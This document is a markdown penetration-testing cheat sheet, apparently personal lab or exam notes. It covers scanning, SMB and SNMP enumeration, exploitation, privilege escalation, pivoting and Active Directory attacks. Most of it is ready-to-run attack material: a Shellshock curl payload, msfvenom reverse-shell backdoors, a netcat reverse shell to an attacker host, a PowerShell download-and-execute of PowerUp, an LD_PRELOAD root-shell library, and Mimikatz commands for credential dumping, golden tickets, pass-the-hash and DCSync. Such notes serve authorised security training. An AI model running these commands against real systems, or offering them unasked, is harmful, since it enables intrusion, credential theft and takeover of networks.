### 1.Scanning

#### 1.1 Most used nmap command
    - nmap -Pn -sn TARGET                 : Search all alive host with or without open ports 
    - nmap -sV -p- -n --open TARGET       : Fingerprint all exposed services on all ports
    - nmap -sV -n TARGET -p SEVICE_PORT   : Fingerprint a specific exposed service
    - nmap -O -n TARGET                   : Find Operating System
    - nmap -O -n TARGET                   : Find Operating System
    - nmap -sS -v --top-ports 1000        : Scan top 1000 ports

    
#### 1.2 Metasploit
    - auxiliary/scanner/smb/smb_version 
    - auxiliary/scanner/portscan/tcp
    - post/multi/gather/ping_sweep
    - run arp_scanner

#### 1.3 Parsing NMAP scan
    - cat nmap.output | grep Up | cut -d' ' -f2 > scope.txt  : Search only live host after ping scan
    - cat scope.top1000.gnmap | grep ' 80/open' | cut -d' ' -f2

### 2.DNS Misconfiguration
    - dig @authorative_dns_server -t axfr DOMAIN              :    Exploiting zone transfer to display all subdomains
    - dig @authorative_dns_server axfr -x subNet (192.168)    :    Reverse DNS

### 3.SMB Misconfiguration

   #### 3.1 Collecting Info
    nmap -p445 --script smb-protocols TARGET
    nmap -p445 --script smb-security-mode TARGET
    nmap -p445 --script smb-enum-users  TARGET
    auxiliary/scanner/smb/smb_enumshares
    rpcclient -U "" demo2.ine.local -N ()
        enumdomusers: Enumerate users
        enumdomgroups: Enumerate domain groups
        enumdomains: Enumerate domain information
        queryuser userName
        netshareenumall : Enumerate shares
    
   #### 3.2 Check Null session (Anynomous Access)
    * Display shares 
         net view IPTarget
         smbmap -H IPTarget
         smbclient -L IPTarget
    * shares access
    smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
    smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
    
   #### 3.3 Mounting SMB Share
     * Mount shared drive : 
       - Linux   : mount -t cifs -o user=USER,password=PWD,rw //IP/share
       - Windows : net use K: \\IPTarget\SharedDrive
     * Upload file
        smbclient //<server_ip>/<shared_folder> -U <username%password>
        put <local_file_path>
   #### 3.4 Metasploit
    exploit/windows/smb/psexec
    exploit/windows/smb/smb_relay
    

### 4.SNMP 
#### 4.1 Detection
    nmap -sU -p 161 Target

#### 4.2 Exploitation to guess community string and Collect Info
    nmap -sU -p 161 --script=snmp-brute Target
    snmpwalk -v 1 -c public Target
    nmap -sU -p 161 --script snmp-* Target > snmp_output

### 5.Exploitation

#### 5.1 Exploit ShellShock CVE-2014-6271 (suppose it is at /browser.cgi)
    nmap -sV -p80 --script http-shellshock --script-args uri=/browser.cgi,cmd=''echo Content-Type: text/html; echo; /usr/bin/id'' Target
    curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://Target/browser.cgi

#### 5.2 Other common exploits 
    - exploit/unix/ftp/proftpd_133c_backdoor for ProFTPD ==> Result in a shell
    - exploit/multi/misc/java_rmi_server ==> Result in a shell
    - auxiliary/scanner/mysql/mysql_authbypass_hashdump ==> dump mysql password hashes
    - exploit/windows/http/badblue_passthru for badblue 2.7 ==> Result in a shell
    - exploit/windows/http/rejetto_hfs_exec for hfs 2.3  ==> Result in a shell

#### 5.3 Webshell
    /usr/share/webshells

#### 5.4 Exploit BOF
    ##### 5.4.1 Fuzzing with spike 
        ###### 5.4.1.1 Spike template
            s_readline(); -- Receive data
            s_string(" "); -- Send constante string
            s_string_variable(" "); -- Send variable string
        ###### 5.4.1.2 Start fuzzing
            generic_send_tcp TARGET_IP TARGET_PORT test.spk 0 0

    ##### 5.4.2 Identify Offset to EIP 
        msf-pattern_create -l 4000 ==> Find content of EIP
        msf-pattern_offset -l 4000 -q 386F4337

        !mona pattern_create 725
        !mona pattern_offset 34684133

    ##### 5.4.3 Find JMP address
        !mona jmp -r esp           -- For stack BOF
        !seh -- pop,pop,ret gadget -- For SEH BOF
    ##### 5.4.3 Generate shell
        msfvenom -p windows/meterpreter/bind_tcp RHOST=0.0.0.0 LPORT=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f python -v shellcode
        msfvenom -p windows/exec cmd=calc.exe exitfunc=thread -b "\x00\x25\x26\x27\x2b" -f c

    
### 6.Post Exploitation

#### 6.0 Internal Reconnaissance
    run winenum
    run arp_scanner –r TargetNetworkSubnet
    run post/multi/gather/filezilla_client_cred
    run post/windows/gather/enum_applications
    run post/windows/gather/smart_hashdump

#### 6.1 Privilege Escalation

##### 6.1.1 MSF

    getsystem
    post/windows/gather/win_privs                : Check if UAC enabled
    exploit/windows/local/bypassuac              : Local exploit to bypass UAC
    post/multi/recon/local_exploit_suggester     : Find local exploit 
    exploit/multi/mysql/mysql_udf_payload        : if mysql running as root and we have the password
    incognito / mimikatz                         : Impersonate priviliged user

##### 6.1.2 Windows
    ##### 6.1.2.1 Via Windows Services 
    
    - Manually : 
        Search all services    
              ==> wmic service where 'NOT PathName like '%system32%' ' GET PathName, Name > list_srv.txt       
        For each service check if user can write in the service Path 
              ==> icacls “Path”
    
    - Using powerUp.ps1 script in https://powersploit.readthedocs.io/en/latest/Privesc/    
        - Import the script to the Victim in Powershell ==> iex (New-Object Net.WebClient).DownloadString('http://HackeIP/PowerUp.ps1')
        - Import-Module .\Privesc
        - Get-Command -Module Powerup
        - Run Invoke-AllChecks
        - Take note of the AbuseFunction (example : PriviligedService)
        - Use the PriviligedService to run any OS Command for example create new Admin user : Invoke-ServiceAbuse -Name PriviligedService  -UserName testUser -Password password_123 -LocalGroup "Administrators"

    ##### 6.1.2.2 bypass uac 
    - Using the UACMe framework
        - Generate backdoor : 
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.2 LPORT=4444 -f exe > 'backdoor.exe'
            msfvenom -p windows/meterpreter/bind_tcp RHOST=10.4.17.32 LPORT=4444 -f exe > backdoor.exe
        - Upload both backdoor.exe and UACMe executable
        - Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe

    ##### 6.1.2.3 privchecks
    https://github.com/itm4n/PrivescCheck
    powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

    ##### 6.1.2.4 Impersonation
    load incognito
    impersonate_token domain\username
    
    
    ##### 6.1.2.4 Useful command
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    reg query "HKCU\Software\Policies\Microsoft\Windows\Installer"
    reg query "HKLM\Software\Policies\Microsoft\Windows\Installer"
    
    tasklist /FI "username eq administrator" 
    get-acl "C:\Program Files\HTTPServer\hfs.exe"  
    Get-ACL -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' | Format-List

    findstr.exe /M /si C:/ password *.txt *.ini *.vbs *.cmd *.ps1 *.bat *.xml *.inf *.eml *.log 
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s
    doskey /history

##### 6.1.3 Linux
    ##### 6.1.3.1 SUID (Linux)
    find / -perm -u=s -type f 2>/dev/null
    find / -user root -perm -4000 -exec ls -ldb {} \;

    ##### 6.1.3.2 Writable file (Linux)
    find / -perm -o=w -type f 2>/dev/null | grep -v "/proc/"

    ##### 6.1.3.3 sudo misconfig
    sudo -l
    
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    void _init() {
     unsetenv("LD_PRELOAD");
     setgid(0);
     setuid(0);
     system("/bin/sh");
    }

    gcc -fPIC -shared -o shell.so shell.c -nostartfiles -w
    
    sudo LD_PRELOAD=/path/to/shell.so binary_can_be_run_as_root

    ##### 6.1.3.4 Find data
    find / -type f | xargs grep -il "password"  2>/dev/null

    ##### Tools
    https://github.com/rebootuser/LinEnum
    enum4linux (Kali)
#### 6.2 Pivoting
    From MSF Console          : route add 192.168.4.0 (subnet) 255.255.255.0(mask) 6(session)
    From metrerpreter         : run autoroute -s 192.168.4.0/24
    
    portfarwarding (meterpreter) ==>  portfwd add -l LocalPort -p ServicePort -r victimeIP (ex: portfwd add -l 1234 -p 80 -r 10.0.17.12)
    portfwd list    ==> This meterpreter command display current portforwarding
    ssh Port Forwarding ==>
        - ssh -4 -L 8000:127.0.0.1:3306 user@target    : Forward traffic going to specific port to another port on the Victim
        - ssh -D 9090 user@target                      : Open socks proxy listning on 9090

#### 6.3 Persistence
        run persistence -h (meterpreter)
        
### 7.Bruteforcing

    Brutefore Using Hydra     : hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt TARGET smb
    SSH Using MSF             : auxiliary/scanner/ssh/ssh_login
    Brute Force MySQL         : use auxiliary/scanner/mysql/mysql_login
    Bruteforce SMB            : auxiliary/scanner/smb/smb_login
    Brute Force Sql Server    : auxiliary/scanner/mssql/mssql_login

### 8.Lateral Movement
    RDP from kali                             : xfreerdp /u:guest_1 /p:guestpwd /v:Target
    Getiing shell from Windows using netcat   : 
            - On attacker machine  : nc -lvp 8080
            - On the victime       : nc attacker_ip 8080 -e cmd.exe 

### 9.Sniffing
#### 9.1 ARP Poisonning
    MiTM between vtcim1 & victm2 using arp poisonning:
        echo 1 > /proc/sys/net/ipv4/ip_forward -- Allow port forwarding
        arpspoof -i eth1 -t vic1_IP -r vic2_IP 
        arpspoof -i eth1 -t vic2_IP -r vic2_IP
        
#### 9.2 DNS sppofing 
    echo "AttackeIP *.DOMAIN_TO_SPOOF" > dnsspoofconf 
    dnsspoof -i  eth1 -f dnsspoofconf
    
### 10.Web Apps
#### 10.1 Scanning/Discovring
wget -S --spider Target
nikto -Help

nikto -h target -Tuning 5 -Format html -Cgidirs all -list-plugins -useragent 'My user-aget'

gobuster dir -u http://targetIp -w /usr/share/wordlists/dirb/common.txt -b
403,404 -x .php,.xml,.txt -r

#### 10.2 SQLi
    ##### 10.2.1 CheatSheet
    https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

    ##### 10.2.2 Sql Server
        
        select name,password_hash from master.sys.sql_logins; -- check the database users 
        select loginname from syslogins where sysadmin = 1; -- check the database users 
        enable_xp_cmdshell;  -- enable command exec
        SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' -- check if impersonation possible
        SELECT SYSTEM_USER  -- show system user
        EXECUTE AS LOGIN = 'sa'  -- move to the selected user        
        EXEC xp_cmdshell whoami -- execute whoami 

### 11 NTLM Hash
    john hash.txt -- Cracking the hash
    
    impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c  normaluser@192.168.7.129  'ipconfig /all' --pass the hash

### 11 Recon for Lateral Movement
    netstat -tnlp


### 12 Active Directory
    #### 12.1 Enumeration
        #### 12.1.1 PowerView
            Get-Domain
            Get-DomainController -Domain xxxx
            Get-DomainSID
            Find-LocalAdminAccess
            Get-DomainObject
            Get-Domain
            https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
         #### 12.1.2 Bloodhound
            cd blooHoundInstallPath\BloodHound\resources\app\Collectors
            powershell -ep bypass
            . ./SharpHound.ps1
            Invoke-Bloodhound -CollectionMethod All
            
    #### 12.2 Attacking AD
        #### 12.2.1 AS-REP Roasting
            Get-DomainUser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }
            .\Rubeus.exe asreproast /user:johnny /outfile:johnhash.txt
            .\johnTheRipper\john-1.9.0-jumbo-1-win64\run\john.exe .\johnhash.txt --format=krb5asrep -wordlist=.\10k-worst-pass.txtc
        #### 12.2.2 Kerberoasting
            Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
            setspn -T research -Q */*

            Add-Type -AssemblyName System.IdentityModel
            New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “serviceprincipalname”
                        
            Invoke-Mimikatz -command '"kerberos::list /export"’

            python.exe .\kerberoast-Python3\tgsrepcrack.py .\10k-worst-pass.txt .\1-40a10000-xxxxxx.kirbi

        #### 12.2.3 AD - Silver Ticket
            Invoke-Mimikatz -Command '"kerberos::golden /domain:Get-Domain /sid:Get-DomainSID /target:DOMAIN_CONTROLLER /service:CIFS /rc4:serviceAccountPwdHash /user:administrator /ptt"'
            
        #### 12.2.4 AD - Golden Ticket
        Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:Get-Domain /sid:Get-DomainSID /krbtgt:0e3cab3ba66afddb664025d96a8dc4d2 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

        #### 12.2.5 Pass-the-Ticket (PtT) Attacks (Run as admin)
        Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
        Invoke-Mimikatz -Command ‘"kerberos::ptt xxxxxx.kirbi"’

        #### 12.2.6 Pass-The-hash (Run as admin)
        Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:Get-Domain /ntlm:84398159ce4d01cfe10cf34d5dae3909 /run:powershell.exe"'

        #### 12.2.7 DCSynch
            Get-ObjectACL -DistinguishedName "CN=PROD,OU=Domain Controllers,DC=research,DC=SECURITY,DC=local" -ResolveGUIDs
            | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -
            match 'GenericAll') } | select IdentityReference 
            
            Invoke-Mimikatz lsadump::dcsync  /domain:Get-Domain /all

        #### 12.2.8 Dump hashes from DC (Require domain admin)
            Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -Computername prod.research.SECURITY.local

        #### 12.2.9 Dump hashes from loacal computer (run as admin)
            Invoke-TokenManipulation –Enumerate
            Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'

        #### 12.2.10 Remote Powershell session
        Enter-PSSession COMPUTER (Find-LocalAdminAccess)


### 13 Password Recovery (Cracking)
    
	#### 12.1 hashcat
	1. Identify the Hash Type (here looking for hash starting with $P$)
		hashcat --example-hashes | grep  'Example.Hash........: \$P\$' -B 11
	
	0. Identify the right mode
		hashcat --help | grep -A1000 "Hash modes" | grep -i ntlm
	
	3. Run Hashcat with a Wordlist (Dictionary Attack)
	
		hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
			-m 0 → MD5 hash mode
			-a 0 → Attack mode (dictionary)
	
	1. Show Cracked Passwords
		hashcat --show -m 0 hash.txt
	
	#### 12.2 john
	
	1. Show format 
		john --list=formats | grep -i nt
	
	2.  Run john with a Wordlist  (if format not specified ==> john select one)
		john --format=NT --wordlist=/path/to/wordlist.txt hashes.txt
	
	3. Show Cracked Passwords
		john --format=NT --show  nt_hashes.txt
	

